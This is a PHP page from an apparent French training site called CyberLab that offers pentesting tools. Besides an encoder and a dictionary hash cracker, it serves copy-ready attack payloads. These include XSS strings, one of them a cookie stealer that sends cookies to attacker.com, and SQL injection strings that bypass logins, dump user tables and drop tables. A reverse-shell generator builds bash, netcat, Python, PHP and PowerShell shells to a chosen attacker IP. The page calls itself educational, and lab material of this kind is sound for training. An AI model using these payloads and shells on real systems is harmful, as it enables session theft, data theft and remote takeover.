<?php
require_once __DIR__ . '/../config/config.php';

// Outil encodage/décodage
$encode_result = '';
$decode_result = '';
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $text = $_POST['text'] ?? '';
    $action = $_POST['action'] ?? '';
    $type = $_POST['type'] ?? 'base64';

    if ($action === 'encode') {
        if ($type === 'base64') $encode_result = base64_encode($text);
        elseif ($type === 'url') $encode_result = urlencode($text);
        elseif ($type === 'html') $encode_result = htmlspecialchars($text);
        elseif ($type === 'hex') $encode_result = bin2hex($text);
        elseif ($type === 'rot13') $encode_result = str_rot13($text);
        elseif ($type === 'md5') $encode_result = md5($text);
        elseif ($type === 'sha1') $encode_result = sha1($text);
        elseif ($type === 'sha256') $encode_result = hash('sha256', $text);
    } elseif ($action === 'decode') {
        if ($type === 'base64') $decode_result = base64_decode($text) ?: '❌ Invalide';
        elseif ($type === 'url') $decode_result = urldecode($text);
        elseif ($type === 'html') $decode_result = html_entity_decode($text);
        elseif ($type === 'hex') $decode_result = (ctype_xdigit($text) ? hex2bin($text) : '❌ Invalide');
        elseif ($type === 'rot13') $decode_result = str_rot13($text);
    }
}

// Outil hash cracker (dictionnaire simple)
$hash_result = '';
if (isset($_POST['crack_hash'])) {
    $hash_to_crack = strtolower(trim($_POST['hash_input'] ?? ''));
    $wordlist = ['admin','password','123456','letmein','admin123','qwerty','abc123','monkey','dragon','master','shadow','sunshine','princess','iloveyou','welcome','login','test','guest','toor','1234'];
    foreach ($wordlist as $word) {
        if (md5($word) === $hash_to_crack || sha1($word) === $hash_to_crack || hash('sha256', $word) === $hash_to_crack) {
            $hash_result = "✅ Mot de passe trouvé : <strong style='color:var(--neon-green)'>$word</strong>";
            break;
        }
    }
    if (!$hash_result) $hash_result = "❌ Non trouvé dans le dictionnaire (essayez hashcat ou john)";
}
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Outils — CyberLab</title>
    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700&family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="/KaliTest/assets/css/style.css">
</head>
<body>
    <canvas id="matrix-canvas"></canvas>

    <nav class="navbar">
        <div class="nav-brand">
            <div class="brand-icon">⬡</div>
            <span class="brand-name">CYBER<span class="accent">LAB</span></span>
        </div>
        <div class="nav-status" style="margin-right:auto">
            <div class="status-dot"></div>
            <span class="status-text" id="nav-time"></span>
        </div>
        <div class="nav-links">
            <a href="/KaliTest/" class="nav-link">Accueil</a>
            <a href="/KaliTest/labs/" class="nav-link">Labs</a>
            <a href="/KaliTest/tools/" class="nav-link active">Outils</a>
        </div>
        <div class="nav-user">
            <?php if(isset($_SESSION['user'])): ?>
            <span class="user-badge">👤 <?= htmlspecialchars($_SESSION['user']['username']) ?></span>
            <a href="/KaliTest/logout.php" class="btn-logout">Déco</a>
            <?php else: ?>
            <a href="/KaliTest/login.php" class="btn-login">Connexion</a>
            <?php endif; ?>
        </div>
    </nav>

    <div class="page-wrapper">
        <div class="page-header">
            <p class="page-breadcrumb"><a href="/KaliTest/">Accueil</a> / Outils</p>
            <h1 class="page-title">🛠️ OUTILS DE PENTESTING</h1>
            <p class="page-desc">Outils utilitaires pour vos tests d'intrusion : encodage, décodage, hash cracking, et génération de payloads.</p>
        </div>

        <div style="display:grid; grid-template-columns:repeat(auto-fill,minmax(500px,1fr)); gap:1.5rem">

            <!-- Encoder / Decoder -->
            <div class="lab-panel">
                <div class="panel-header">🔐 ENCODEUR / DÉCODEUR</div>
                <div class="panel-body">
                    <form method="POST">
                        <div class="form-group">
                            <label class="form-label">TEXTE / DONNÉES</label>
                            <textarea name="text" class="form-textarea" placeholder="Entrez le texte à encoder/décoder..."><?= htmlspecialchars($_POST['text'] ?? '') ?></textarea>
                        </div>
                        <div class="form-group">
                            <label class="form-label">TYPE</label>
                            <select name="type" class="form-select">
                                <option value="base64">Base64</option>
                                <option value="url">URL Encoding</option>
                                <option value="html">HTML Entities</option>
                                <option value="hex">Hexadécimal</option>
                                <option value="rot13">ROT13</option>
                                <option value="md5">MD5 Hash</option>
                                <option value="sha1">SHA1 Hash</option>
                                <option value="sha256">SHA256 Hash</option>
                            </select>
                        </div>
                        <div style="display:flex; gap:.8rem">
                            <button type="submit" name="action" value="encode" class="btn-submit">⬆️ ENCODER</button>
                            <button type="submit" name="action" value="decode" class="btn-submit" style="background:linear-gradient(135deg,var(--neon-blue),#0099bb)">⬇️ DÉCODER</button>
                        </div>
                    </form>

                    <?php if ($encode_result): ?>
                    <div class="result-box" style="margin-top:1rem">
                        <div class="result-header">📤 RÉSULTAT (Encodage)</div>
                        <div class="result-body">
                            <div style="font-family:var(--font-mono); font-size:.85rem; color:var(--neon-green); word-break:break-all; cursor:pointer"
                                 onclick="navigator.clipboard.writeText(this.textContent); showToast('Copié !')">
                                <?= htmlspecialchars($encode_result) ?>
                            </div>
                            <p style="font-family:var(--font-mono); font-size:.65rem; color:var(--text-secondary); margin-top:.5rem">Cliquez pour copier</p>
                        </div>
                    </div>
                    <?php endif; ?>

                    <?php if ($decode_result): ?>
                    <div class="result-box" style="margin-top:1rem">
                        <div class="result-header">📥 RÉSULTAT (Décodage)</div>
                        <div class="result-body">
                            <div style="font-family:var(--font-mono); font-size:.85rem; color:var(--neon-blue); word-break:break-all; cursor:pointer"
                                 onclick="navigator.clipboard.writeText(this.textContent); showToast('Copié !')">
                                <?= htmlspecialchars($decode_result) ?>
                            </div>
                        </div>
                    </div>
                    <?php endif; ?>
                </div>
            </div>

            <!-- Hash Cracker -->
            <div class="lab-panel">
                <div class="panel-header">💀 HASH CRACKER (Dictionnaire)</div>
                <div class="panel-body">
                    <p style="font-size:.85rem; color:var(--text-secondary); margin-bottom:1rem">
                        Tentez de cracker un hash MD5/SHA1/SHA256 via une attaque par dictionnaire.
                        Le dictionnaire contient les mots de passe les plus communs.
                    </p>
                    <form method="POST">
                        <div class="form-group">
                            <label class="form-label">HASH À CRACKER</label>
                            <input type="text" name="hash_input" class="form-input"
                                   placeholder="ex: 5f4dcc3b5aa765d61d8327deb882cf99 (=password)"
                                   value="<?= htmlspecialchars($_POST['hash_input'] ?? '') ?>">
                            <p class="form-hint">💡 MD5('admin123') = 0192023a7bbd73250516f069df18b500</p>
                        </div>
                        <button type="submit" name="crack_hash" value="1" class="btn-submit" style="background:linear-gradient(135deg,#ff3366,#cc0033)">
                            💥 CRACKER
                        </button>
                    </form>

                    <?php if ($hash_result): ?>
                    <div class="alert <?= str_starts_with($hash_result, '✅') ? 'alert-success' : 'alert-danger' ?>" style="margin-top:1rem">
                        <?= $hash_result ?>
                    </div>
                    <?php endif; ?>

                    <div style="margin-top:1rem; padding:.8rem; background:rgba(0,0,0,.2); border-radius:6px">
                        <p style="font-family:var(--font-mono); font-size:.7rem; color:var(--neon-blue); margin-bottom:.5rem">// HASHES D'EXEMPLE</p>
                        <div style="display:grid; gap:.3rem">
                            <?php
                            $examples = ['admin','password','admin123','letmein','qwerty'];
                            foreach ($examples as $word): ?>
                            <div style="font-family:var(--font-mono); font-size:.7rem; color:var(--text-secondary)">
                                <span style="color:var(--neon-yellow)"><?= $word ?></span> → <?= md5($word) ?>
                            </div>
                            <?php endforeach; ?>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Payload Generator -->
            <div class="lab-panel">
                <div class="panel-header">⚡ GÉNÉRATEUR DE PAYLOADS XSS</div>
                <div class="panel-body">
                    <p style="font-size:.85rem; color:var(--text-secondary); margin-bottom:1rem">
                        Payloads XSS courants prêts à l'emploi. Cliquez pour copier.
                    </p>
                    <?php
                    $xss_payloads = [
                        'Basic Alert' => '<script>alert(1)</script>',
                        'Cookie Stealer' => '<script>fetch("http://attacker.com?c="+document.cookie)</script>',
                        'Image onerror' => '<img src=x onerror=alert(document.domain)>',
                        'SVG onload' => '<svg onload=alert(1)>',
                        'Input autofocus' => '<input autofocus onfocus=alert(1)>',
                        'Details open' => '<details open ontoggle=alert(1)>',
                        'Body onload' => '<body onload=alert(1)>',
                        'Quote escape' => '"><script>alert(1)</script>',
                        'HTML comment break' => '<!--><script>alert(1)</script>',
                        'JavaScript URI' => 'javascript:alert(1)',
                    ];
                    foreach ($xss_payloads as $name => $payload): ?>
                    <div style="display:flex; align-items:center; justify-content:space-between; padding:.5rem; border:1px solid var(--border-dim); border-radius:4px; margin-bottom:.4rem; cursor:pointer; transition:var(--transition)"
                         onclick="copyPayload('<?= addslashes(htmlspecialchars($payload)) ?>', '<?= $name ?>')"
                         onmouseover="this.style.background='rgba(0,255,136,.04)'"
                         onmouseout="this.style.background=''">
                        <div>
                            <div style="font-family:var(--font-mono); font-size:.7rem; color:var(--neon-blue); margin-bottom:.2rem"><?= $name ?></div>
                            <div style="font-family:var(--font-mono); font-size:.72rem; color:var(--neon-green)"><?= htmlspecialchars(substr($payload, 0, 50)) ?><?= strlen($payload) > 50 ? '...' : '' ?></div>
                        </div>
                        <span style="font-family:var(--font-mono); font-size:.7rem; color:var(--text-secondary)">📋</span>
                    </div>
                    <?php endforeach; ?>
                </div>
            </div>

            <!-- SQLi Payloads -->
            <div class="lab-panel">
                <div class="panel-header">🗄️ PAYLOADS SQL INJECTION</div>
                <div class="panel-body">
                    <?php
                    $sqli_payloads = [
                        'Auth Bypass' => "' OR '1'='1",
                        'Auth Bypass 2' => "admin'--",
                        'Union 4 cols' => "1 UNION SELECT 1,2,3,4-- -",
                        'Get databases' => "1 UNION SELECT 1,group_concat(schema_name),3,4 FROM information_schema.schemata-- -",
                        'Get tables' => "1 UNION SELECT 1,group_concat(table_name),3,4 FROM information_schema.tables WHERE table_schema=database()-- -",
                        'Get columns' => "1 UNION SELECT 1,group_concat(column_name),3,4 FROM information_schema.columns WHERE table_name='users'-- -",
                        'Dump users' => "1 UNION SELECT id,username,password,email FROM users-- -",
                        'Time-based blind' => "1 AND SLEEP(5)-- -",
                        'Error-based' => "1 AND extractvalue(1,concat(0x7e,(SELECT version())))-- -",
                        'Stacked queries' => "1; DROP TABLE products--",
                    ];
                    foreach ($sqli_payloads as $name => $payload): ?>
                    <div style="display:flex; align-items:center; justify-content:space-between; padding:.5rem; border:1px solid var(--border-dim); border-radius:4px; margin-bottom:.4rem; cursor:pointer; transition:var(--transition)"
                         onclick="copyPayload('<?= addslashes(htmlspecialchars($payload)) ?>', '<?= $name ?>')"
                         onmouseover="this.style.background='rgba(0,255,136,.04)'"
                         onmouseout="this.style.background=''">
                        <div>
                            <div style="font-family:var(--font-mono); font-size:.7rem; color:var(--neon-yellow); margin-bottom:.2rem"><?= $name ?></div>
                            <div style="font-family:var(--font-mono); font-size:.72rem; color:var(--neon-green)"><?= htmlspecialchars(substr($payload, 0, 55)) ?><?= strlen($payload) > 55 ? '...' : '' ?></div>
                        </div>
                        <span style="font-family:var(--font-mono); font-size:.7rem; color:var(--text-secondary)">📋</span>
                    </div>
                    <?php endforeach; ?>
                </div>
            </div>

            <!-- HTTP Headers Analyzer -->
            <div class="lab-panel">
                <div class="panel-header">🌐 EN-TÊTES HTTP REÇUS</div>
                <div class="panel-body">
                    <p style="font-size:.85rem; color:var(--text-secondary); margin-bottom:1rem">
                        En-têtes de votre requête HTTP actuelle — utile pour comprendre ce qu'un serveur voit.
                    </p>
                    <table class="data-table">
                        <tr><th>En-tête</th><th>Valeur</th></tr>
                        <?php
                        $important = ['HTTP_USER_AGENT','HTTP_ACCEPT','HTTP_ACCEPT_LANGUAGE','HTTP_REFERER','HTTP_X_FORWARDED_FOR','REMOTE_ADDR','SERVER_SOFTWARE','REQUEST_METHOD','HTTP_HOST'];
                        foreach ($important as $key):
                            if (isset($_SERVER[$key])): ?>
                        <tr>
                            <td style="color:var(--neon-blue); white-space:nowrap"><?= str_replace('HTTP_', '', $key) ?></td>
                            <td style="word-break:break-all; font-size:.75rem"><?= htmlspecialchars(substr($_SERVER[$key], 0, 100)) ?></td>
                        </tr>
                        <?php endif; endforeach; ?>
                    </table>

                    <div style="margin-top:1rem; padding:.8rem; background:rgba(255,51,102,.04); border:1px solid rgba(255,51,102,.1); border-radius:6px">
                        <p style="font-family:var(--font-mono); font-size:.7rem; color:var(--neon-red); margin-bottom:.3rem">⚠️ HEADERS MANQUANTS (vulnérabilités)</p>
                        <?php
                        $missing = ['X-Frame-Options','X-Content-Type-Options','Strict-Transport-Security','Content-Security-Policy','X-XSS-Protection'];
                        foreach ($missing as $h): ?>
                        <div style="font-family:var(--font-mono); font-size:.72rem; color:var(--text-secondary); margin:.2rem 0">❌ <?= $h ?></div>
                        <?php endforeach; ?>
                    </div>
                </div>
            </div>

            <!-- Reverse Shell Generator -->
            <div class="lab-panel">
                <div class="panel-header">💀 GÉNÉRATEUR REVERSE SHELL (Éducatif)</div>
                <div class="panel-body">
                    <p style="font-size:.85rem; color:var(--text-secondary); margin-bottom:1rem">
                        Génère des commandes de reverse shell. <strong style="color:var(--neon-red)">Usage éducatif uniquement sur vos propres systèmes !</strong>
                    </p>
                    <div class="form-group">
                        <label class="form-label">IP ATTAQUANT</label>
                        <input type="text" id="rev-ip" class="form-input" value="192.168.1.100" oninput="updateShells()">
                    </div>
                    <div class="form-group">
                        <label class="form-label">PORT</label>
                        <input type="number" id="rev-port" class="form-input" value="4444" oninput="updateShells()">
                    </div>
                    <div id="shells-output" style="margin-top:1rem"></div>
                </div>
            </div>

        </div>
    </div>

    <script src="/KaliTest/assets/js/main.js"></script>
    <script>
        function copyPayload(payload, name) {
            const decoded = payload.replace(/&lt;/g,'<').replace(/&gt;/g,'>').replace(/&amp;/g,'&').replace(/&#039;/g,"'").replace(/&quot;/g,'"');
            navigator.clipboard.writeText(decoded).then(() => {
                showToast(`"${name}" copié dans le presse-papiers !`);
            }).catch(() => {
                prompt('Copiez ce payload:', decoded);
            });
        }

        function updateShells() {
            const ip = document.getElementById('rev-ip').value;
            const port = document.getElementById('rev-port').value;
            const shells = [
                { name: 'Bash', cmd: `bash -i >& /dev/tcp/${ip}/${port} 0>&1` },
                { name: 'NC (Netcat)', cmd: `nc -e /bin/sh ${ip} ${port}` },
                { name: 'Python 3', cmd: `python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("${ip}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh"])'` },
                { name: 'PHP', cmd: `php -r '$sock=fsockopen("${ip}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'` },
                { name: 'PowerShell', cmd: `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("${ip}",${port});` },
                { name: 'Listener (Kali)', cmd: `nc -lvnp ${port}` },
            ];

            const out = document.getElementById('shells-output');
            out.innerHTML = shells.map(s => `
                <div style="margin-bottom:.6rem; padding:.6rem; background:rgba(0,0,0,.3); border:1px solid rgba(0,255,136,.08); border-radius:4px; cursor:pointer"
                     onclick="copyPayload('${s.cmd.replace(/'/g,"\\'")}', '${s.name}')">
                    <div style="font-family:var(--font-mono); font-size:.65rem; color:var(--neon-blue); margin-bottom:.3rem">${s.name} <span style="float:right; color:var(--text-secondary)">📋 Copier</span></div>
                    <code style="font-family:var(--font-mono); font-size:.7rem; color:var(--neon-green); word-break:break-all">${s.cmd.replace(/</g,'&lt;')}</code>
                </div>
            `).join('');
        }

        updateShells();
    </script>
</body>
</html>
